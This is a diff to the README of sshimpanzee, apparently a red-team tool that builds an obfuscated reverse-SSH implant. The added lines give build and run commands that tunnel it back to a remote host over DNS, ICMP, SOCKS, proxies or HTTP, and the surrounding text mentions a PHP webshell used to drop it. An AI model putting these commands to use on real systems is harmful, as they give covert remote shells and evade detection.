@@ -50,11 +50,14 @@ Alternatively use -d option if you want debug information. Note that, in debug m
 
 It is possible to provide remote address and port at runtime through environment variables.
 To do so, build sshimpanzee with `-D` option. 
-Then at runtime, run sshd by setting remote address and port with `r` and `p` environment variables:
-
+```
+./builder.py -D
+```
+Then, at runtime simply specify the `REMOTE` and `PORT` environment variables:
+```
+REMOTE=192.168.0.2 PORT=8097 ./sshd29u28u29u
 ```
 
-```
 
 
 ## Tunnels 
@@ -140,11 +143,29 @@ You can edit proxy_cli.py script to specify proxies.
 ```
 ssh -o ProxyCommand='python proxy_cli.py http://127.0.0.1:8080/proxy.php EncryptionKey 2>/dev/null' a@a -i ../../keys/CLIENT 
 ```
-
 #### Side notes about http Encapsulation
 1) Proxy.php is a minimal webshell, you can use it to upload sshd to the server and run commands. proxy_cli.py offers --run and --drop options to do so.
 
 2) You might experience a huge input lag, it is because a delay of 1 to 5 second is added to the packet sent by ssh client to prevent from generating to many http request. If you don't mind generating a lot of http request (thus a lot of logs on the web server) add the --no-buffer option to proxy_cli.py command.
+
+
+### One Tunnel to rule them all
+A way to combined every tunnel was introduced to get a single binary capable of every method described above.
+It is a really hacky solution which would deserve a refactor but it is still usable currently.
+Use the following command to generate a single binary combining every tunnels (and their corresponding server).
+```
+./builder.py --tun combined,tunnels=dns:icmp:sock:proxysock:http_enc,obfuscate,path_fd=/dev/shm/lexfo_sshim,buildserv
+```
+
+To use the generated sshd you will need to specify the `MODE` environment variables and other environment variable required by each tunnel:
+``` 
+MODE=icmp REMOTE=10.0.0.1 ./sshd -d
+MODE=dns REMOTE=<YOUR DOMAIN> <RESOLVER=CUSTOM RESOLVER IF NEEDED> ./sshd -d 
+MODE=proxysock http_proxy=http://127.0.0.1:8080 REMOTE=10.0.0.1 PORT=8000 ./sshd -d
+MODE=http_enc ./sshd
+# Because it is generated in tunnel mode, you can not use the standard direct connect, but it is still possible to use the "sock" tunnel and specify REMOTE and PORT 
+MODE=sock REMOTE=10.0.0.1 PORT=8000 ./sshd -d
+```
 
 
 ## Using the sshimpanzee client
